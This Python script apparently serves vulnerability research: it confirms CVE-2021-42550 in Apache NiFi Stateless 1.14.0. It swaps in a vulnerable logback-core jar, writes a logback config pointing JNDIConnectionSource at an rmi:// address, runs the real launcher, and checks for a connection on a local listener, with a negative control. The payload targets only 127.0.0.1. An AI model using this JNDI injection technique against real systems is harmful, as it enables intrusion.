#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import socket
import subprocess
import tarfile
import threading
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-42550__apache_nifi_stateless_1_14_0_v1_logback_real_entrypoint"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
ARCHIVE_NAME = "nifi-stateless-1.14.0-bin.tar.gz"
ARCHIVE = LEGACY_ROOT / "historical-scan" / ARCHIVE_NAME
ARCHIVE_URL = "https://archive.apache.org/dist/nifi/1.14.0/nifi-stateless-1.14.0-bin.tar.gz"
SOURCE_CASE = "logback/CVE-2021-42550"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/logback/CVE-2021-42550/v1")
V1_LOGBACK_CORE = ROOT / "vendor-m2/ch/qos/logback/logback-core/1.2.7/logback-core-1.2.7.jar"
V1_LOGBACK_CORE_URL = "https://repo1.maven.org/maven2/ch/qos/logback/logback-core/1.2.7/logback-core-1.2.7.jar"
JAVA8 = Path("/data/lhq/.sdkman/candidates/java/8.0.452-amzn")
TARGET_CORE_NAME = "logback-core-1.2.3.jar"


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def run(cmd, cwd, log_path, env=None, timeout=None):
    with log_path.open("a", encoding="utf-8") as log:
        log.write("$ " + " ".join(cmd) + "\n")
        proc = subprocess.run(
            cmd,
            cwd=str(cwd),
            env=env,
            stdout=log,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout,
        )
        log.write(f"[exit] {proc.returncode}\n")
    return proc.returncode


def ensure_v1_logback_core(log_path):
    if V1_LOGBACK_CORE.exists():
        return
    V1_LOGBACK_CORE.parent.mkdir(parents=True, exist_ok=True)
    with log_path.open("a", encoding="utf-8") as log:
        log.write(f"Downloading {V1_LOGBACK_CORE_URL}\n")
        proc = subprocess.run(
            [
                "curl",
                "-L",
                "--connect-timeout",
                "10",
                "--max-time",
                "90",
                "-o",
                str(V1_LOGBACK_CORE),
                V1_LOGBACK_CORE_URL,
            ],
            stdout=log,
            stderr=subprocess.STDOUT,
            text=True,
        )
        log.write(f"[exit] {proc.returncode}\n")
    if not V1_LOGBACK_CORE.exists() or V1_LOGBACK_CORE.stat().st_size < 100_000:
        raise RuntimeError(f"failed to fetch v1 logback-core jar: {V1_LOGBACK_CORE}")


def ensure_nifi(sample_dir, log_path):
    archive_ok = False
    if ARCHIVE.exists():
        proc = subprocess.run(
            ["tar", "tzf", str(ARCHIVE)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            text=True,
        )
        archive_ok = proc.returncode == 0
    if not archive_ok:
        import urllib.request

        ARCHIVE.parent.mkdir(parents=True, exist_ok=True)
        tmp = ARCHIVE.with_suffix(".tar.gz.tmp")
        with log_path.open("a", encoding="utf-8") as log:
            log.write(f"Downloading {ARCHIVE_URL}\n")
        urllib.request.urlretrieve(ARCHIVE_URL, tmp)
        tmp.rename(ARCHIVE)
    dist = sample_dir / "nifi-stateless-1.14.0"
    if dist.exists():
        shutil.rmtree(dist)
    with tarfile.open(ARCHIVE, "r:gz") as tar:
        tar.extractall(sample_dir)
    return dist


def inspect_jar(jar_path):
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "jndi_connection_source_class_present": False,
        "version": None,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_connection_source_class_present"] = (
            "ch/qos/logback/core/db/JNDIConnectionSource.class" in names
        )
        props = "META-INF/maven/ch.qos.logback/logback-core/pom.properties"
        if props in names:
            for line in zf.read(props).decode("utf-8", "replace").splitlines():
                if line.startswith("version="):
                    result["version"] = line.split("=", 1)[1]
    return result


def insert_v1_logback(dist, evidence_dir):
    ensure_v1_logback_core(evidence_dir / "run.log")
    target = dist / "lib" / TARGET_CORE_NAME
    before = {
        "target_path": str(target),
        "existed_before_insertion": target.exists(),
        "sha256_before": sha256(target) if target.exists() else None,
        "inspection_before": inspect_jar(target),
    }
    if not target.exists():
        raise FileNotFoundError(target)
    shutil.copy2(V1_LOGBACK_CORE, target)
    after = {
        "target_path": str(target),
        "source_v1_runtime_jar": str(V1_LOGBACK_CORE),
        "sha256_source": sha256(V1_LOGBACK_CORE),
        "sha256_target_after": sha256(target),
        "inspection_after": inspect_jar(target),
        "target_filename_preserved_for_downstream_classpath": True,
    }
    jars = sorted(str(p.relative_to(dist)) for p in (dist / "lib").glob("logback-*.jar"))
    evidence = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_method": (
            "isolated runtime dependency insertion: official Apache NiFi Stateless 1.14.0 "
            "binary with generated-v1-selected vulnerable logback-core 1.2.7 bytes copied "
            "into the original NiFi logback-core 1.2.3 runtime filename before invoking "
            "the real bin/nifi-stateless.sh entrypoint"
        ),
        "before_insertion": {TARGET_CORE_NAME: before},
        "inserted_v1_jars": {TARGET_CORE_NAME: after},
        "runtime_logback_jars_after_insertion": jars,
        "logback_classic_retained": "lib/logback-classic-1.2.3.jar",
    }
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(evidence, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "dependency-evidence.txt").write_text("\n".join(jars) + "\n", encoding="utf-8")
    return evidence


def start_rmi_listener(evidence_dir, case_name, timeout=10):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-rmi-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"RMI listener did not start for {case_name}")
    return port_box["port"], received, thread


def logback_config(jndi_location):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<configuration debug="true">
  <appender name="DB" class="ch.qos.logback.classic.db.DBAppender">
    <connectionSource class="ch.qos.logback.core.db.JNDIConnectionSource">
      <jndiLocation>{jndi_location}</jndiLocation>
    </connectionSource>
  </appender>
  <root level="INFO">
    <appender-ref ref="DB"/>
  </root>
</configuration>
"""


def exercise_nifi(dist, evidence_dir, case_name, location_factory):
    port, received, thread = start_rmi_listener(evidence_dir, case_name)
    jndi_location = location_factory(port)
    config = dist / "conf" / "stateless-logback.xml"
    config.write_text(logback_config(jndi_location), encoding="utf-8")
    (evidence_dir / f"{case_name}-stateless-logback.xml").write_text(
        config.read_text(encoding="utf-8"), encoding="utf-8"
    )
    env = os.environ.copy()
    if JAVA8.exists():
        env["JAVA_HOME"] = str(JAVA8)
        env["PATH"] = str(JAVA8 / "bin") + ":" + env.get("PATH", "")
    env["STATELESS_JAVA_OPTS"] = "-Xms128m -Xmx256m"
    proc = subprocess.run(
        ["bash", "bin/nifi-stateless.sh", "--help"],
        cwd=str(dist),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=25,
    )
    thread.join(10)
    result = {
        "case": case_name,
        "jndi_location": jndi_location,
        "entrypoint": "bin/nifi-stateless.sh --help",
        "returncode": proc.returncode,
        "listener_received_count": len(received),
        "listener_received": received,
        "stdout_tail": proc.stdout[-6000:],
        "java_home": env.get("JAVA_HOME"),
    }
    (evidence_dir / f"{case_name}.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    workdir = Path(args.workdir)
    sample_dir = workdir / "samples" / SAMPLE_ID
    if args.fresh and sample_dir.exists():
        shutil.rmtree(sample_dir)
    evidence_dir = sample_dir / "evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")

    dist = ensure_nifi(sample_dir, run_log)
    dependency_evidence = insert_v1_logback(dist, evidence_dir)
    positive = exercise_nifi(
        dist,
        evidence_dir,
        "positive",
        lambda port: f"rmi://127.0.0.1:{port}/item",
    )
    negative = exercise_nifi(
        dist,
        evidence_dir,
        "negative",
        lambda port: "java:comp/env/jdbc/item",
    )
    confirmed = positive["listener_received_count"] > 0 and negative["listener_received_count"] == 0
    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "downstream_repo": "apache/nifi",
        "downstream_application": "Apache NiFi Stateless 1.14.0",
        "downstream_entrypoint": "bin/nifi-stateless.sh --help",
        "attack_surface": "NiFi Stateless startup loads conf/stateless-logback.xml through the real downstream launcher",
        "cve": "CVE-2021-42550",
        "upstream_library": "logback",
        "vulnerable_version": "1.2.7",
        "dependency_evidence": dependency_evidence,
        "payload": positive["jndi_location"],
        "positive": positive,
        "negative": negative,
        "dynamic_signal": {
            "positive_listener_received_count": positive["listener_received_count"],
            "positive_listener_received": positive["listener_received"],
            "negative_listener_received_count": negative["listener_received_count"],
            "negative_listener_received": negative["listener_received"],
        },
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": (
            "The verifier does not execute the v1 App.java harness. It inserts the vulnerable "
            "logback-core 1.2.7 runtime dependency selected by logback/CVE-2021-42550/v1 into "
            "an isolated Apache NiFi Stateless distribution, then triggers JNDIConnectionSource "
            "through NiFi's real launcher and logback configuration path. The positive control "
            "receives a JRMI connection; the negative java:comp/env control receives none."
        ),
    }
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "Run `python3 scripts/verify_nifi_stateless_logback_v1_inserted.py --fresh` from "
        "`/data/lhq/workspace/ljl-v1-downstream-insertions`.\n"
        "The verifier inserts logback/CVE-2021-42550/v1's vulnerable logback-core 1.2.7 "
        "dependency into Apache NiFi Stateless 1.14.0 and confirms the real launcher loads "
        "the downstream logback configuration and performs the JNDI lookup.\n",
        encoding="utf-8",
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
